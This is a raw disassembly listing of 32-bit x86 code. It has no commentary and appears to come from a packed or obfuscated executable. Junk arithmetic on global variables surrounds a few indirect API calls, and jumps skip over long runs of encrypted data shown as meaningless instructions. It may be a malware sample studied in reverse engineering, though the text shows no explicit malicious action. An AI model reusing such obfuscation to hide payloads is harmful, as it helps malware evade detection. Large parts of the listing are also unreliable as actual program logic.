  40182a:	xor    DWORD PTR ds:0x428465,edx
  401830:	mov    edi,DWORD PTR ds:0x4283d5
  401836:	or     DWORD PTR ds:0x42846d,edi
  40183c:	or     DWORD PTR ds:0x4282e5,0x7336
  401846:	sbb    DWORD PTR ds:0x4283e9,0x42f3
  401850:	mov    DWORD PTR ds:0x428519,0x382b
  40185a:	inc    DWORD PTR ds:0x428521
  401860:	mov    DWORD PTR [ebp-0xc],eax
  401863:	mov    eax,ds:0x422520
  401868:	mov    ecx,DWORD PTR [ebp-0xc]
  40186b:	sbb    DWORD PTR ds:0x428405,0xc55
  401875:	mov    eax,DWORD PTR [eax]
  401877:	xor    edx,edi
  401879:	add    eax,DWORD PTR [ecx]
  40187b:	mov    edi,0x32de6d5d
  401880:	mov    ecx,DWORD PTR ds:0x428401
  401886:	sbb    DWORD PTR ds:0x4283ad,ecx
  40188c:	mov    DWORD PTR [ebp-0x14],eax
  40188f:	cmp    DWORD PTR ds:0x428509,0x0
  401896:	not    ecx
  401898:	mov    DWORD PTR ds:0x428419,0x2a4e
  4018a2:	mov    edx,DWORD PTR ds:0x4284ed
  4018a8:	jmp    0x401900
  4018ad:	mov    DWORD PTR ds:0x4282d9,0x4cb6
  4018b7:	mov    eax,0x4273
  4018bc:	cmp    DWORD PTR ds:0x428509,0x0
  4018c3:	jle    0x4018e8
  4018c9:	push   DWORD PTR [ebp-0x14]
  4018cc:	push   0x428105
  4018d1:	push   0x428191
  4018d6:	call   DWORD PTR ds:0x42e22c
  4018dc:	add    ecx,edx
  4018de:	or     DWORD PTR ds:0x4283f1,0x428411
  4018e8:	and    ecx,0x1796
  4018ee:	sub    edx,0x208e
  4018f4:	xor    DWORD PTR ds:0x428405,edx
  4018fa:	sub    DWORD PTR ds:0x42840d,ebx
  401900:	mov    eax,DWORD PTR [ebp+0x18]
  401903:	mov    ecx,DWORD PTR [ebp+0x1c]
  401906:	cmp    DWORD PTR ds:0x4283b9,0x0
  40190d:	movzx  edx,BYTE PTR ds:0x4283b5
  401914:	mov    edx,DWORD PTR ds:0x428491
  40191a:	movzx  edx,WORD PTR ds:0x428519
  401921:	jmp    0x401971
  401926:	mov    DWORD PTR ds:0x428505,0x405c
  401930:	cmp    DWORD PTR ds:0x4283b9,0x0
  401937:	jge    0x401961
  40193d:	push   DWORD PTR [ebp-0xc]
  401940:	push   DWORD PTR [ebp-0x14]
  401943:	push   0x1391
  401948:	push   0x7a4e
  40194d:	call   DWORD PTR ds:0x42e0a0
  401953:	neg    edx
  401955:	add    edx,0x51c2
  40195b:	sbb    edx,DWORD PTR ds:0x428305
  401961:	adc    DWORD PTR ds:0x428501,ecx
  401967:	sub    DWORD PTR ds:0x428305,0x3064
  401971:	shrd   eax,ecx,0x2
  401975:	shr    ecx,0x2
  401978:	cmp    DWORD PTR ds:0x428415,0x0
  40197f:	mov    ecx,DWORD PTR ds:0x4283ed
  401985:	mov    ecx,0x3508
  40198a:	not    edx
  40198c:	jmp    0x4019d4
  401991:	mov    DWORD PTR ds:0x4284f5,edi
  401997:	mov    DWORD PTR ds:0x4283d9,0x1955
  4019a1:	cmp    DWORD PTR ds:0x428415,0x0
  4019a8:	je     0x4019cc
  4019ae:	push   0x4281e3
  4019b3:	push   0x400000
  4019b8:	call   DWORD PTR ds:0x42e0a4
  4019be:	neg    edx
  4019c0:	xor    DWORD PTR ds:0x4282e1,0x55e7
  4019ca:	sub    ecx,ecx
  4019cc:	not    ecx
  4019ce:	and    ecx,DWORD PTR ds:0x4283e1
  4019d4:	mov    ecx,DWORD PTR [ebp+0x18]
  4019d7:	mov    edx,DWORD PTR [ebp+0x1c]
  4019da:	add    DWORD PTR ds:0x42847d,0x428509
  4019e4:	xor    eax,edi
  4019e6:	xor    edx,edx
  4019e8:	or     edx,eax
  4019ea:	and    eax,0x837
  4019ef:	mov    DWORD PTR [ebp-0x3c],edx
  4019f2:	jmp    0x401d93
  4019f7:	inc    DWORD PTR [edx+0x3c]
  4019fa:	pop    ebx
  4019fb:	mov    esp,0xf09aa0bb
  401a00:	fisubr DWORD PTR [edx+0x2083bae3]
  401a06:	sahf   
  401a07:	mov    esi,0xbdbebecc
  401a0c:	les    edi,FWORD PTR [esi+0x44de67be]
  401a12:	mov    eax,DWORD PTR [esi-0x79]
  401a15:	ret    
  401a16:	or     ah,BYTE PTR [edx]
  401a18:	add    edx,DWORD PTR [esi-0x788134e1]
  401a1e:	js     0x401a11
  401a20:	arpl   WORD PTR [ebx+eiz*1-0x65dcd21],si
  401a27:	call   0xc7b2:0x92e45bd3
  401a2e:	addr16 mov ecx,0xba6b733e
  401a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a35:	push   0xba95f1c3
  401a3a:	jmp    0x59fd:0x7b334780
  401a41:	(bad)  
  401a42:	stc    
  401a43:	jae    0x401a07
  401a45:	xchg   ebp,eax
  401a46:	lods   al,BYTE PTR ds:[esi]
  401a47:	std    
  401a48:	aad    0xa1
  401a4a:	xchg   ecx,eax
  401a4b:	mov    bh,cl
  401a4d:	xchg   DWORD PTR [ebx-0x8a396d9],esi
  401a53:	push   esi
  401a54:	sbb    DWORD PTR [edx+0x2a6cf36c],ebp
  401a5a:	mov    ds:0xee8827a5,al
  401a5f:	bound  esi,QWORD PTR [esi+0x5e]
  401a62:	not    cl
  401a64:	pop    ecx
  401a65:	xchg   DWORD PTR fs:[esi+edi*2-0x13b07cdc],ebp
  401a6d:	mov    cl,0xc2
  401a6f:	add    al,0x81
  401a71:	test   ah,0xcc
  401a74:	xor    ch,BYTE PTR [esi+edx*2-0xe]
  401a78:	mov    ebx,0xf24005a6
  401a7d:	iret   
  401a7e:	ror    BYTE PTR [ebx+0x7c],0x91
  401a82:	test   al,0x93
  401a84:	fwait
  401a85:	je     0x401aaa
  401a87:	sub    al,0xdf
  401a89:	and    cl,BYTE PTR [edx+0x1c299619]
  401a8f:	neg    DWORD PTR [edx+0x3]
  401a92:	(bad)  
  401a93:	aas    
  401a94:	add    dl,bl
  401a96:	out    dx,al
  401a97:	inc    esp
  401a98:	xlat   BYTE PTR ds:[ebx]
  401a99:	mov    edx,cs
  401a9b:	adc    al,0x2c
  401a9d:	add    al,0xd3
  401a9f:	add    bx,di
  401aa2:	and    DWORD PTR [eax+0x78737b01],ecx
  401aa8:	and    BYTE PTR ds:0x558689a,ah
  401aae:	ror    ecx,cl
  401ab0:	jae    0x401aae
  401ab2:	push   0x35
  401ab4:	es ret 
  401ab6:	sahf   
  401ab7:	sbb    bh,ah
  401ab9:	test   BYTE PTR [ebp-0x33],bl
  401abc:	jmp    0x401a9a
  401abe:	sbb    eax,0x49c9bb3
  401ac3:	call   0x5f09705b
  401ac8:	push   cs
  401ac9:	loopne 0x401a69
  401acb:	cmc    
  401acc:	inc    esp
  401acd:	test   BYTE PTR [edx],0x1a
  401ad0:	mov    esp,0x91ef1986
  401ad5:	or     DWORD PTR [ecx+0x3b],eax
  401ad8:	jb     0x401b0b
  401ada:	add    al,0x69
  401adc:	sub    BYTE PTR [edi+0x12e33173],cl
  401ae2:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  401ae4:	inc    ecx
  401ae5:	add    eax,DWORD PTR [eax]
  401ae7:	fist   DWORD PTR [edx]
  401ae9:	and    ah,cl
  401aeb:	fst    DWORD PTR [esi+0x3b]
  401aee:	mov    esp,0x15186f38
  401af3:	push   esi
  401af4:	mov    eax,ds:0x82eda6d9
  401af9:	jl     0x401b5a
  401afb:	test   al,0x6c
  401afd:	cwde   
  401afe:	scas   al,BYTE PTR es:[edi]
  401aff:	jle    0x401acc
  401b01:	aas    
  401b02:	sub    ecx,DWORD PTR [edi-0xa0be4fe]
  401b08:	mov    al,ds:0x88670226
  401b0d:	je     0x401ae8
  401b0f:	ret    0x5e3a
  401b12:	or     bl,cl
  401b14:	test   DWORD PTR [ebx-0x1a],ebp
  401b17:	mov    al,0xb6
  401b19:	lods   eax,DWORD PTR ds:[esi]
  401b1a:	cmp    BYTE PTR [ebx],ah
  401b1c:	pushf  
  401b1d:	test   eax,0x94e4c99e
  401b22:	push   esp
  401b23:	ret    0x9161
  401b26:	les    ebx,FWORD PTR ds:0x609d1047
  401b2c:	test   al,0x50
  401b2e:	test   DWORD PTR [eax-0x61],ebp
  401b31:	arpl   si,ax
  401b33:	dec    ebx
  401b34:	push   0xffffff9c
  401b36:	rcr    dh,1
  401b38:	jae    0x401b14
  401b3a:	or     al,BYTE PTR [ecx]
  401b3c:	xor    ecx,DWORD PTR [ebx]
  401b3e:	push   ebp
  401b3f:	in     eax,0x45
  401b41:	add    esi,0xd7f45ced
  401b47:	addr16 add eax,0x1a0be987
  401b4d:	and    DWORD PTR [ebp+0x67],esp
  401b50:	xchg   DWORD PTR [ecx+0x3f],ecx
  401b53:	xchg   BYTE PTR [ecx],bh
  401b55:	and    BYTE PTR [ecx-0x52],0xe0
  401b59:	rcr    BYTE PTR [esi-0x38],cl
  401b5c:	lahf   
  401b5d:	xchg   sp,ax
  401b5f:	mov    cl,0xd0
  401b61:	jl     0x401b08
  401b63:	or     DWORD PTR ds:0xcf27160c,esi
  401b69:	idiv   BYTE PTR ds:0x58aa8914
  401b6f:	sbb    dh,BYTE PTR [ebx-0x156db1df]
  401b75:	and    ah,BYTE PTR [esi-0xc]
  401b78:	dec    edx
  401b79:	add    al,0xd7
  401b7b:	jno    0x401b3d
  401b7d:	cmp    al,0xdb
  401b7f:	popa   
  401b80:	aas    
  401b81:	sbb    DWORD PTR [ebx],esi
  401b83:	imul   edx,edi,0xfffffffe
  401b86:	aad    0xcf
  401b88:	push   cs
  401b89:	sbb    ebx,DWORD PTR [ebx]
  401b8b:	js     0x401bee
  401b8d:	cmp    dh,BYTE PTR [eax+0x0]
  401b90:	adc    BYTE PTR [edi+eax*8+0x59],bl
  401b94:	or     edx,eax
  401b96:	mov    bh,0x79
  401b98:	and    eax,0x256265c0
  401b9d:	fdiv   DWORD PTR [eax+0x5458168e]
  401ba3:	or     ebp,esp
  401ba5:	mov    dh,0x52
  401ba7:	fimul  WORD PTR [edx+0x7da8710a]
  401bad:	dec    edi
  401bae:	out    0x17,eax
  401bb0:	mov    ds:0xbe34c9d6,al
  401bb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bb6:	mov    BYTE PTR [eax+0x77],ah
  401bb9:	jne    0x401b8b
  401bbb:	or     ch,cl
  401bbd:	(bad)  
  401bbe:	dec    eax
  401bbf:	stos   BYTE PTR es:[edi],al
  401bc0:	cwde   
  401bc1:	mov    bh,0x3a
  401bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bc4:	jge    0x401c43
  401bc6:	cmp    DWORD PTR [esi-0x76c4bfb0],ebp
  401bcc:	add    cl,dh
  401bce:	adc    al,0xe1
  401bd0:	test   edi,0x4de0d2b2
  401bd6:	in     al,dx
  401bd7:	in     eax,0xae
  401bd9:	lock jnp 0x401ba5
  401bdc:	mov    edi,0xe1bc9f7a
  401be1:	clc    
  401be2:	sbb    BYTE PTR [eax-0x48be6f7b],ah
  401be8:	add    edx,DWORD PTR [edi+0x5158371b]
  401bee:	outs   dx,BYTE PTR ds:[esi]
  401bef:	ja     0x401c36
  401bf1:	inc    eax
  401bf2:	popf   
  401bf3:	or     ebx,DWORD PTR [edx-0x7d]
  401bf6:	jl     0x401c32
  401bf8:	mov    esi,0xb6448b71
  401bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bfe:	inc    eax
  401bff:	mov    ?,WORD PTR [ebp+0x6dabdbce]
  401c05:	nop
  401c06:	ror    DWORD PTR [esi],0x99
  401c09:	iret   
  401c0a:	sbb    BYTE PTR ds:0x84ee8e9d,0xc4
  401c11:	adc    ebp,DWORD PTR [ecx+0x3cd19fac]
  401c17:	jo     0x401bfa
  401c19:	jle    0x401bdc
  401c1b:	cmc    
  401c1c:	scas   eax,DWORD PTR es:[edi]
  401c1d:	shl    BYTE PTR [edi+0x20],0xa4
  401c21:	ror    DWORD PTR [edi+0x7259005b],cl
  401c27:	mov    ch,0x27
  401c29:	jp     0x401bc7
  401c2b:	loope  0x401c92
  401c2d:	test   BYTE PTR [eax-0x2f6b6172],ah
  401c33:	inc    ecx
  401c34:	repnz xchg esi,eax
  401c36:	xor    eax,0xbafc8745
  401c3b:	add    dh,BYTE PTR [ebx+0x33]
  401c3e:	xchg   ecx,eax
  401c3f:	ins    BYTE PTR es:[edi],dx
  401c40:	mov    bl,0x96
  401c42:	jmp    0x401bc6
  401c44:	inc    eax
  401c45:	xchg   dl,bh
  401c47:	ins    DWORD PTR es:[edi],dx
  401c48:	xchg   ebp,eax
  401c49:	xchg   ecx,eax
  401c4a:	cmp    eax,0x2aabd62b
  401c4f:	adc    BYTE PTR [edi],ch
  401c51:	jno    0x401cc9
  401c53:	rol    DWORD PTR [edi],cl
  401c55:	cmp    al,0x6
  401c57:	add    al,0x43
  401c59:	pushf  
  401c5a:	jno    0x401cb1
  401c5c:	pushf  
  401c5d:	and    BYTE PTR [edi],bh
  401c5f:	mov    bl,0x51
  401c61:	jo     0x401cac
  401c63:	xor    DWORD PTR [ebx+0x1721613],ebp
  401c69:	mov    WORD PTR [ecx],gs
  401c6b:	add    eax,0xc11e4c0d
  401c70:	pop    ss
  401c71:	daa    
  401c72:	lea    esi,[esi+0x53]
  401c75:	inc    edx
  401c76:	cmp    esp,0x48
  401c79:	pop    esi
  401c7a:	(bad)  
  401c7b:	push   eax
  401c7c:	cmp    ah,ah
  401c7e:	adc    bl,al
  401c80:	mov    edx,0x27532a65
  401c85:	lea    edx,[eax-0x19]
  401c88:	pushf  
  401c89:	push   edx
  401c8a:	mov    bh,0xc3
  401c8c:	daa    
  401c8d:	and    DWORD PTR [edx],0xffffff87
  401c90:	push   0xffffff98
  401c92:	xor    esp,ebp
  401c94:	push   esp
  401c95:	sbb    ebp,DWORD PTR [esp+ebx*2-0x3e]
  401c99:	std    
  401c9a:	xor    al,BYTE PTR [ebx]
  401c9c:	jge    0x401c49
  401c9e:	test   DWORD PTR [edi+0x487f0e89],ecx
  401ca4:	enter  0x7ef7,0xc9
  401ca8:	sbb    bl,BYTE PTR [ecx*1+0x1ccedfef]
  401caf:	addr16 icebp 
  401cb1:	or     BYTE PTR [ecx-0x216ba21e],dl
  401cb7:	(bad)  
  401cb8:	mov    ds:0x239abd37,al
  401cbd:	fisttp QWORD PTR [edi+ebp*2+0x41e6523d]
  401cc4:	scas   al,BYTE PTR es:[edi]
  401cc5:	push   ss
  401cc6:	and    esi,eax
  401cc8:	jno    0x401d44
  401cca:	pushf  
  401ccb:	fld    DWORD PTR [edx]
  401ccd:	ror    ah,cl
  401ccf:	dec    esi
  401cd0:	pop    esp
  401cd1:	inc    edx
  401cd2:	(bad)  
  401cd3:	fisub  WORD PTR [ebx]
  401cd5:	jp     0x401c96
  401cd7:	fdivp  st(4),st
  401cd9:	mov    edx,0x88ee0e6
  401cde:	xchg   edi,eax
  401cdf:	addr16 cli 
  401ce1:	js     0x401cd4
  401ce3:	ds and al,0x15
  401ce6:	or     al,0x60
  401ce8:	fiadd  WORD PTR [ecx-0x36]
  401ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cec:	add    al,0x24
  401cee:	jg     0x401cbf
  401cf0:	inc    edi
  401cf1:	pop    ecx
  401cf2:	add    DWORD PTR [esi],edi
  401cf4:	cmp    al,0xb7
  401cf6:	les    edi,FWORD PTR [ebp+0x2c0d806]
  401cfc:	adc    eax,0x255eb478
  401d01:	dec    ebp
  401d02:	push   es
  401d03:	cmp    al,0x57
  401d05:	loope  0x401ce7
  401d07:	jle    0x401c8d
  401d09:	mov    BYTE PTR [esi-0x58],dl
  401d0c:	pop    ebp
  401d0d:	pop    es
  401d0e:	test   eax,0x662d1d9b
  401d13:	mov    bh,0x31
  401d15:	jae    0x401d17
  401d17:	or     DWORD PTR [edi-0x70],0xb9470c06
  401d1e:	add    WORD PTR [eax+0x20797ed3],bx
  401d25:	(bad)  
  401d27:	rcl    DWORD PTR [eax+eiz*4-0x7f],1
  401d2b:	mov    dh,0xc0
  401d2d:	outs   dx,BYTE PTR ds:[esi]
  401d2e:	xchg   edi,eax
  401d2f:	lods   al,BYTE PTR ds:[esi]
  401d30:	in     al,dx
  401d31:	dec    edx
  401d32:	sbb    eax,0x4c990e70
  401d37:	dec    esp
  401d38:	sbb    BYTE PTR [ecx+0x1cf7e199],ah
  401d3e:	xchg   ebp,eax
  401d3f:	int3   
  401d40:	jnp    0x401cc7
  401d42:	push   0x1441c43f
  401d47:	in     al,0xc8
  401d49:	sahf   
  401d4a:	fs fwait
  401d4c:	pop    edx
  401d4d:	out    dx,al
  401d4e:	xchg   esi,eax
  401d4f:	mov    eax,ds:0x317d998
  401d54:	fwait
  401d55:	lahf   
  401d56:	xor    al,0xc9
  401d58:	or     DWORD PTR [eax+0x27281832],eax
  401d5e:	aam    0x67
  401d60:	xchg   ecx,eax
  401d61:	popf   
  401d62:	mov    ds:0xdb622948,al
  401d67:	cmp    al,0x68
  401d69:	sub    cl,BYTE PTR ds:0xd90b8599
  401d6f:	sar    BYTE PTR [eax-0x47],cl
  401d72:	into   
  401d73:	sub    al,0x39
  401d75:	lds    edi,FWORD PTR [eax+0xbad047a]
  401d7b:	inc    edi
  401d7c:	stos   BYTE PTR es:[edi],al
  401d7d:	fimul  WORD PTR [ebp-0x32]
  401d80:	and    BYTE PTR ds:0x8f5612dd,ah
  401d86:	mov    ds:0x6fae3acf,eax
  401d8b:	xchg   ebp,eax
  401d8c:	dec    ebx
  401d8d:	sub    bl,BYTE PTR [ecx+0x352f6b8b]
  401d93:	mov    DWORD PTR [ebp-0x70],0x2c55
  401d9a:	mov    DWORD PTR [ebp-0x6c],0x456f
  401da1:	mov    DWORD PTR [ebp-0x70],0x78a6
  401da8:	mov    DWORD PTR [ebp-0x6c],0x188
  401daf:	sbb    DWORD PTR ds:0x4283c5,ecx
  401db5:	mov    DWORD PTR [ebp-0x70],0x5b3f
  401dbc:	mov    DWORD PTR [ebp-0x6c],0x3219
  401dc3:	add    DWORD PTR ds:0x4284fd,0x3158
  401dcd:	mov    DWORD PTR [ebp-0x70],0x231c
  401dd4:	add    eax,DWORD PTR ds:0x4283ad
  401dda:	mov    DWORD PTR [ebp-0x6c],0x1337
  401de1:	sub    DWORD PTR ds:0x428311,edx
  401de7:	mov    DWORD PTR [ebp-0x70],0x7593
  401dee:	mov    DWORD PTR [ebp-0x6c],0x11b8
  401df5:	movzx  eax,BYTE PTR ds:0x4282ed
  401dfc:	and    DWORD PTR ds:0x428515,eax
  401e02:	mov    DWORD PTR [ebp-0x70],0x3b72
  401e09:	mov    DWORD PTR [ebp-0x6c],0x3abc
  401e10:	cmp    DWORD PTR ds:0x4283b5,0x0
  401e17:	mov    DWORD PTR ds:0x4284ed,0x646
  401e21:	mov    DWORD PTR ds:0x4283c5,0x14a3
  401e2b:	jmp    0x401eb8
  401e30:	movzx  eax,WORD PTR ds:0x428491
  401e37:	mov    DWORD PTR ds:0x4283b5,ebx
  401e3d:	cmp    DWORD PTR ds:0x4283b5,0x0
  401e44:	jle    0x401e86
  401e4a:	push   DWORD PTR [ebp-0x20]
  401e4d:	push   0x4281e3
  401e52:	push   0x4280e7
  401e57:	push   0x400000
  401e5c:	call   DWORD PTR ds:0x42e230
  401e62:	xor    DWORD PTR ds:0x4284ed,0x4536
  401e6c:	sub    DWORD PTR ds:0x428475,edi
  401e72:	sbb    DWORD PTR ds:0x4283dd,0x4284ed
  401e7c:	add    DWORD PTR ds:0x428405,0x5ddd
  401e86:	sbb    DWORD PTR ds:0x428515,0x4283c5
  401e90:	adc    DWORD PTR ds:0x428509,0x5ea9
  401e9a:	sub    DWORD PTR ds:0x4284f9,0x4284e5
  401ea4:	add    DWORD PTR ds:0x4282e5,0x5dac
  401eae:	add    DWORD PTR ds:0x4282dd,0x46fc
  401eb8:	mov    DWORD PTR [ebp-0x68],0x1b45
  401ebf:	xor    DWORD PTR ds:0x4283d1,edx
  401ec5:	mov    DWORD PTR [ebp-0x64],0x767d
  401ecc:	or     DWORD PTR ds:0x4284ed,edi
  401ed2:	mov    DWORD PTR [ebp-0x60],0x1d973857
  401ed9:	mov    DWORD PTR [ebp-0x5c],0x0
  401ee0:	mov    DWORD PTR [ebp-0x34],0x599d
  401ee7:	xor    eax,DWORD PTR ds:0x428465
  401eed:	mov    DWORD PTR [ebp-0x2c],0x165d
  401ef4:	mov    DWORD PTR [ebp-0x1c],0xc51
  401efb:	xor    eax,eax
  401efd:	add    eax,DWORD PTR ds:0x4282f9
  401f03:	or     eax,DWORD PTR ds:0x4283d5
  401f09:	mov    ds:0x4282f9,eax
  401f0e:	mov    DWORD PTR [ebp-0x44],0x3f55
  401f15:	cmp    DWORD PTR ds:0x4284fd,0x0
  401f1c:	mov    DWORD PTR ds:0x4282d5,0xd43
  401f26:	mov    DWORD PTR ds:0x428519,0x5a6d
  401f30:	mov    DWORD PTR ds:0x4283bd,edx
  401f36:	jmp    0x40200c
  401f3b:	mov    eax,0x36f8
  401f40:	mov    DWORD PTR ds:0x428415,edx
  401f46:	cmp    DWORD PTR ds:0x4284fd,0x0
  401f4d:	jg     0x401f82
  401f53:	push   0x4521
  401f58:	push   0x4861
  401f5d:	push   DWORD PTR [ebp-0x20]
  401f60:	push   0x4281d8
  401f65:	push   DWORD PTR [ebp-0x28]
  401f68:	call   DWORD PTR ds:0x42e0a8
  401f6e:	adc    DWORD PTR ds:0x4283e5,0x7cd6
  401f78:	sbb    DWORD PTR ds:0x428491,0xfa0
  401f82:	adc    DWORD PTR ds:0x4283f1,0x4282dd
  401f8c:	add    DWORD PTR ds:0x4282f9,0x428411
  401f96:	cmp    DWORD PTR ds:0x4284ed,0x0
  401f9d:	mov    DWORD PTR ds:0x428415,0x6252
  401fa7:	mov    DWORD PTR ds:0x428311,0x40d0
  401fb1:	jmp    0x40200c
  401fb6:	mov    DWORD PTR ds:0x4284f5,edx
  401fbc:	cmp    DWORD PTR ds:0x4284ed,0x0
  401fc3:	ja     0x401fee
  401fc9:	push   0x428105
  401fce:	call   DWORD PTR ds:0x42e234
  401fd4:	and    DWORD PTR ds:0x4282fd,0x428499
  401fde:	sbb    DWORD PTR ds:0x4283d9,0x5068
  401fe8:	xor    DWORD PTR ds:0x428491,edi
  401fee:	and    DWORD PTR ds:0x428481,0x42851d
  401ff8:	xor    DWORD PTR ds:0x428499,0x428515
  402002:	add    DWORD PTR ds:0x4284e5,0xd3c
  40200c:	mov    DWORD PTR [ebp-0x44],0x1
  402013:	mov    DWORD PTR [ebp-0x44],0x42e8
  40201a:	mov    eax,DWORD PTR [ebp-0x60]
  40201d:	add    DWORD PTR ds:0x4282f5,0x42846d
  402027:	shl    ecx,0x1e
  40202a:	mov    ecx,DWORD PTR [ebp-0x5c]
  40202d:	add    DWORD PTR ds:0x428475,0x5f4
  402037:	push   ecx
  402038:	adc    DWORD PTR ds:0x42849d,0x4282e9
  402042:	push   eax
  402043:	or     DWORD PTR ds:0x4284a1,0x42847d
  40204d:	push   0xddf
  402052:	sbb    DWORD PTR ds:0x428301,0x218d
  40205c:	jmp    0x4023fd
  402061:	mov    ebp,0x2b7a2504
  402066:	jl     0x401ffa
  402068:	mov    esp,0x9e22191a
  40206d:	popf   
  40206e:	inc    esp
  40206f:	call   0xbdbe:0xbed2bde3
  402076:	les    edi,FWORD PTR [esi+0x38e195be]
  40207c:	xchg   edx,eax
  40207d:	stos   BYTE PTR es:[edi],al
  40207e:	sbb    BYTE PTR [eax+0x459326d0],bh
  402084:	out    dx,al
  402085:	fist   DWORD PTR [ecx+ebp*2]
  402088:	push   esp
  402089:	jbe    0x4020a2
  40208b:	cmp    ebx,esp
  40208d:	sub    cl,BYTE PTR [esp+ecx*8+0x6a6804ae]
  402094:	fwait
  402095:	jecxz  0x402067
  402097:	imul   esp,DWORD PTR [eax+0x5e],0xb974cc37
  40209e:	arpl   WORD PTR [esi-0x1c5d0958],bp
  4020a4:	jg     0x402028
  4020a6:	mov    al,0x9f
  4020a8:	mov    edx,0x29bbcfc3
  4020ad:	icebp  
  4020ae:	mov    bl,0xf5
  4020b0:	or     ecx,eax
  4020b2:	jmp    0x402037
  4020b4:	dec    edx
  4020b5:	cdq    
  4020b6:	cmp    ah,BYTE PTR [ecx+0x3bcbdbe3]
  4020bc:	push   esi
  4020bd:	xchg   ebp,eax
  4020be:	outs   dx,DWORD PTR ds:[esi]
  4020bf:	push   es
  4020c0:	iret   
  4020c1:	adc    edi,ebx
  4020c3:	(bad)  
  4020c4:	cdq    
  4020c5:	push   esi
  4020c6:	rol    BYTE PTR [di],cl
  4020c9:	dec    esi
  4020ca:	xlat   BYTE PTR ds:[ebx]
  4020cb:	repnz push ebp
  4020cd:	outs   dx,BYTE PTR ds:[esi]
  4020ce:	xchg   ebp,eax
  4020cf:	in     eax,0x81
  4020d1:	or     DWORD PTR [eax+0x4f],ecx
  4020d4:	and    bh,ch
  4020d6:	imul   ebp,DWORD PTR [eax-0x9],0xbf3686c9
  4020dd:	xchg   ebp,eax
  4020de:	jp     0x4020c4
  4020e0:	mov    edi,ebx
  4020e2:	out    dx,al
  4020e3:	rcl    eax,1
  4020e5:	mov    ebp,0xb719e156
  4020ea:	std    
  4020eb:	and    al,0x27
  4020ed:	arpl   WORD PTR [edi+0x8fa5084],dx
  4020f3:	mov    ds:0xd732bfad,eax
  4020f8:	mov    ds:0x528f4b21,al
  4020fd:	dec    ebp
  4020fe:	test   eax,0xc21c460a
  402103:	call   0x88a8f01b
  402108:	stos   DWORD PTR es:[edi],eax
  402109:	test   ecx,0x7aac90d8
  40210f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402110:	test   eax,0xbc9626e2
  402115:	pop    esi
  402116:	rol    esp,cl
  402118:	imul   eax,ebx,0xffd9127f
  40211e:	adc    BYTE PTR [ecx+0x3dce86b],bh
  402124:	fucom  st(5)
  402126:	cmc    
  402127:	pop    ss
  402128:	mov    esi,0xcdd8dee0
  40212d:	iret   
  40212e:	ja     0x4020b5
  402130:	test   eax,0x63898cc3
  402135:	jns    0x4020cd
  402137:	sahf   
  402138:	mov    ecx,0x2180ea39
  40213d:	clc    
  40213e:	or     DWORD PTR [ecx+0x2f],0x7cd23b6c
  402145:	daa    
  402146:	cdq    
  402147:	mov    ds:0xc55292e1,al
  40214c:	aaa    
  40214d:	ja     0x4021bc
  40214f:	mov    bh,0xd3
  402151:	jb     0x4021b0
  402153:	mov    ecx,eax
  402155:	dec    ebp
  402156:	nop
  402157:	popa   
  402158:	jle    0x402173
  40215a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40215b:	fwait
  40215c:	mov    eax,ds:0x9dcd2feb
  402161:	dec    edx
  402162:	adc    eax,0xfd003868
  402167:	mov    gs,edi
  402169:	inc    edi
  40216a:	push   ds
  40216b:	fwait
  40216c:	jne    0x40215c
  40216e:	daa    
  40216f:	jne    0x4021b1
  402171:	imul   esp,DWORD PTR [esp+edx*8],0x978bdb5e
  402178:	inc    eax
  402179:	icebp  
  40217a:	in     eax,dx
  40217b:	mov    ah,0xa8
  40217d:	mov    BYTE PTR [eax+0x22070eb3],cl
  402183:	push   0x463e3e85
  402188:	retf   0x8d1c
  40218b:	es sub eax,0x29ad5e94
  402191:	inc    edi
  402192:	inc    BYTE PTR [edx]
  402194:	xchg   esi,eax
  402195:	mov    edi,0x892342bb
  40219a:	lock hlt 
  40219c:	shr    DWORD PTR [edi],cl
  40219e:	shl    DWORD PTR [edi+0x641ed3e9],0x1f
  4021a5:	cld    
  4021a6:	retf   
  4021a7:	rcl    DWORD PTR [ecx+0x48],cl
  4021aa:	ret    0x403b
  4021ad:	adc    DWORD PTR [ebx+0x6d],edi
  4021b0:	mov    bl,BYTE PTR [ebx+0x76]
  4021b3:	mov    dh,0x8d
  4021b5:	arpl   ax,sp
  4021b7:	aam    0x3
  4021b9:	out    dx,al
  4021ba:	sahf   
  4021bb:	lahf   
  4021bc:	push   ebx
  4021bd:	jmp    0x658:0x135d19b5
  4021c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021c5:	mov    dh,al
  4021c7:	inc    ecx
  4021c8:	sub    bh,BYTE PTR [edi+edi*8+0x2f2de2e2]
  4021cf:	pop    ebp
  4021d0:	pop    ss
  4021d1:	pushf  
  4021d2:	push   esi
  4021d3:	xor    esi,DWORD PTR [esi+0x1b]
  4021d6:	mov    dl,0x76
  4021d8:	test   al,0xef
  4021da:	outs   dx,BYTE PTR ds:[esi]
  4021db:	cwde   
  4021dc:	arpl   bx,sp
  4021de:	mov    ebx,0xb3823bc4
  4021e3:	xor    DWORD PTR [edx+0x2e],ebx
  4021e6:	std    
  4021e7:	fucomp st(4)
  4021e9:	js     0x4021e9
  4021eb:	jge    0x40216d
  4021ed:	cmp    esp,DWORD PTR [ecx-0x42b55ef5]
  4021f3:	(bad)  
  4021f4:	jne    0x402210
  4021f6:	add    edx,DWORD PTR [edx]
  4021f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021f9:	scas   eax,DWORD PTR es:[edi]
  4021fa:	jge    0x4021af
  4021fc:	jno    0x4021af
  4021fe:	jno    0x402250
  402200:	dec    esp
  402201:	test   BYTE PTR [esi-0x147cadc5],dh
  402207:	dec    ebp
  402208:	add    DWORD PTR [ecx],ecx
  40220a:	addr16 pop es
  40220c:	sub    bh,BYTE PTR [ebx]
  40220e:	push   ecx
  40220f:	jno    0x4021d6
  402211:	outs   dx,DWORD PTR ds:[esi]
  402212:	mov    dh,0xb4
  402214:	jbe    0x402196
  402216:	cmp    DWORD PTR [ebp-0xf],ecx
